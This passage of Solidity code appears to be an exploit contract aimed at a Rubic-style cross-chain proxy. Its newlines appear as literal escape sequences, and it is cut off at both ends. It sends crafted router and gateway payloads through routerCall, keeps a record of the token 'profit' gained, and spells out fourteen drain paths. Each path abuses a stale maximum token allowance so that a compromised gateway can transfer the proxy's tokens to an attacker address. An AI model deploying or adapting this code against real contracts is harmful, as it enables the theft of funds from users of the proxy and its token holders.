y gatewayPayload = gatewayPayloads[i];\n            if (gatewayPayload.length == 0) {\n                continue;\n            }\n\n            bytes[10] memory routerPayloads = _routerForwardPayloads(gateway, gatewayPayload);\n            for (uint256 j = 0; j < routerPayloads.length; j++) {\n                bytes memory routerPayload = routerPayloads[j];\n                if (routerPayload.length == 0) {\n                    continue;\n                }\n                if (_tryRouterCall(params, gateway, token, fixedFee, routerPayload)) {\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n\n    function _tryRouterCall(\n        IRubicProxyLike.BaseCrossChainParams memory params,\n        address gateway,\n        address token,\n        uint256 fixedFee,\n        bytes memory data\n    ) internal returns (bool) {\n        uint256 beforeLocal = _balanceOf(token, address(this));\n        (bool ok, ) = TARGET.call{value: fixedFee}(\n            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)\n        );\n        uint256 afterLocal = _balanceOf(token, address(this));\n        if (!ok || afterLocal <= beforeLocal) {\n            return false;\n        }\n\n        _recordTokenProfit(token, afterLocal - beforeLocal, _path);\n        return true;\n    }\n\n    function _attemptGatewayDrain(\n        address gateway,\n        address token,\n        address proxy,\n        address attacker,\n        uint256 amount\n    ) internal returns (bool) {\n        bytes[14] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);\n        string[14] memory paths;\n\n        paths[0] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount) directly\";\n        paths[1] = \"routerCall -> stale max allowance persists -> compromised gateway calls pullToken(token, proxy, attacker, amount)\";\n        paths[2] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(token, proxy, attacker, amount)\";\n        paths[3] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount, token)\";\n        paths[4] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, uint160(amount), token)\";\n        paths[5] = \"routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount)\";\n        paths[6] = \"routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[7] = \"routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount)\";\n        paths[8] = \"routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[9] = \"routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount)\";\n        paths[10] = \"routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[11] = \"routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount)\";\n        paths[12] = \"routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[13] = \"routerCall -> stale max allowance persists -> compromised gateway functionCalls token.transferFrom(proxy, attacker, amount)\";\n\n        for (uint256 i = 0; i < payloads.length; i++) {\n            bytes memory payload = payloads[i];\n            if (payload.length == 0) {\n                continue;\n            }\n\n            uint256 beforeBalance = _balanceOf(token, address